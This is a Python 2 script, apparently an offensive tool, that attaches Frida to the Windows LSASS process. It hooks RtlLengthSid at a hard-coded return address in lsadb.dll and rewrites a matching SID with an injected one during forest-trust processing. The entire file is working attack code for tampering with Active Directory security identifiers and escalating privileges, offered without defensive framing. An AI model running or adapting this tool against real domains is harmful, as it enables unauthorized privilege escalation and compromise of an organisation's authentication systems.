#!/usr/bin/env python2
from __future__ import print_function
import sys, struct, re, argparse, frida
### Python 2 version


def get_args():
    parser = argparse.ArgumentParser(description="frida_intercept.py")
    parser.add_argument("-s", "--source-sid", help="Source SID", 
                        type=str, default=None, required=True)
    parser.add_argument("-i", "--inject-sid", help="Inject SID", 
                        type=str, default=None, required=True)
    parser.add_argument("-t", "--target-pid", help="Target LSASS process ID or name", 
                        type=str, default=None, required=True)
    ar,trash = parser.parse_known_args()
    args = vars(ar)
    pat = re.compile('[a-zA-Z.]+')
    if not re.match(pat,args['target_pid']):
        args['target_pid'] = int(args['target_pid']) 
    return vars(ar)


def pack_sid_le_octalhex(sid):
    inp = sid.replace("S-1-5-21-","").split("-")
    inp_hex = [hex(int(x))[2:].zfill(8) for x in inp]
    packed_hexes = [[ struct.pack("<I",int(item.replace("L",""),16))] for item in inp_hex]
    hexbyte_string = ', '.join([', '.join(['0x' + (', 0x'.join([
        ("%02x" % ord(z)).upper() for z in y
        ])) for y in x
        ]) for x in packed_hexes])
    final_string = ("["
        "0x01, 0x04, 0x00, 0x00, "
        "0x00, 0x00, 0x00, 0x05, "
        "0x15, 0x00, 0x00, 0x00, "
        "%s]" % hexbyte_string)
    return final_string


def template(source_sid, inject_sid):
    indent=8
    return ('\n'.join([x[indent:] for x in ("""
        // Find base address of current imported lsadb.dll by lsass
        var baseAddr = Module.findBaseAddress('lsadb.dll');
        console.log('lsadb.dll baseAddr: ' + baseAddr);
        // Add call to RtlLengthSid from LsaDbpDsForestBuildTrustEntryForAttrBlock
        // (address valid for Server 2016 v1607)
        var returnaddr = ptr('0x151dc');
        var resolvedreturnaddr = baseAddr.add(returnaddr)
        // Sid as binary array to find/replace
        var buf1 = %s;
        var newsid = %s;
        // Find module and attach
        var f = Module.getExportByName('ntdll.dll', 'RtlLengthSid');
        Interceptor.attach(f, {
        onEnter: function (args) {
            // Only do something calls that have the return address we want
            if(this.returnAddress.equals(resolvedreturnaddr)){
                console.log("entering intercepted function will return to r2 " + this.returnAddress);
                // Dump current SID
                console.log(hexdump(args[0], {
                offset: 0,
                length: 24,
                header: true,
                ansi: false
                }));
                // If this is the sid to replace, do so
                if(equal(buf1, args[0].readByteArray(24))){
                    console.log("sid matches!");
                    args[0].writeByteArray(newsid);
                    console.log("modified SID in response");
                }
            }
        },
        });
        function equal (buf1, buf2)
        {
            var dv1 = buf1;
            var dv2 = new Uint8Array(buf2);
            for (var i = 0 ; i != buf2.byteLength ; i++)
            {
                if (dv1[i] != dv2[i]){
                    return false;
                }
            }
            return true;
        }

        """ % (source_sid,inject_sid)).split('\n')]))


def on_message(message, data):
    print("[%s] => %s" % (message,data))


def main():
    args = get_args()
    target_process = args['target_pid']
    source_sid = pack_sid_le_octalhex(args['source_sid']) ## list of octalhex bytes
    inject_sid = pack_sid_le_octalhex(args['inject_sid']) ## list of octalhex bytes
    session = frida.attach(target_process)
    script = session.create_script(template(source_sid, inject_sid))
    script.on('message', on_message)
    script.load()
    print("[!] Ctrl+D on UNIX, Ctrl+Z on Windows/cmd.exe to detach from instrumented program.\n\n")
    sys.stdin.read()
    session.detach()


if __name__ == '__main__':
    main()
